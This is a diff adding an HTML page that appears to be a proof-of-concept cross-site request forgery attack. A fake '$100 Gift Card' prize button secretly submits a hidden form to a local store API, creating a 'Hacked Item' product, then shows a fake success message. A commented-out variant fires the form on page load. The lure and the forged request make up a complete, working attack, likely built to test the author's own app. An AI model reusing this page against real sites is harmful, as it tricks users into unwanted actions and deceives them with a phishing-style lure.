@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Gift Card!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        .gift-card {
+            border: 2px solid #ff6b6b;
+            padding: 20px;
+            margin: 20px auto;
+            max-width: 400px;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎁 Congratulations! You've won a $100 Gift Card! 🎁</h1>
+    <div class="gift-card">
+        <h2>Click below to claim your prize!</h2>
+        <p>Limited time offer - Claim now!</p>
+        <button onclick="claimGift()">Claim Gift Card</button>
+    </div>
+
+    <!-- Hidden auto-submitting form -->
+    <form id="csrfForm" action="http://localhost:3000/api/addProduct" method="POST" style="display: none;">
+        <input type="hidden" name="name" value="Hacked Item">
+        <input type="hidden" name="description" value="Added via CSRF">
+        <input type="hidden" name="price" value="999">
+        <input type="hidden" name="quantityInStock" value="1000">
+        <input type="hidden" name="catagory" value="Hacked">
+        <input type="hidden" name="supplierId" value="666">
+    </form>
+
+    <script>
+        function claimGift() {
+            // Show a fake loading animation
+            alert("Processing your gift card...");
+            
+            // Auto-submit the form
+            document.getElementById('csrfForm').submit();
+            
+            // Show fake success message
+            setTimeout(() => {
+                alert("Gift card claimed successfully! (This is fake - the real attack happened in the background)");
+            }, 1000);
+        }
+
+        // Alternative: Auto-submit on page load
+        // window.onload = function() {
+        //     document.getElementById('csrfForm').submit();
+        // }
+    </script>
+</body>
+</html> 
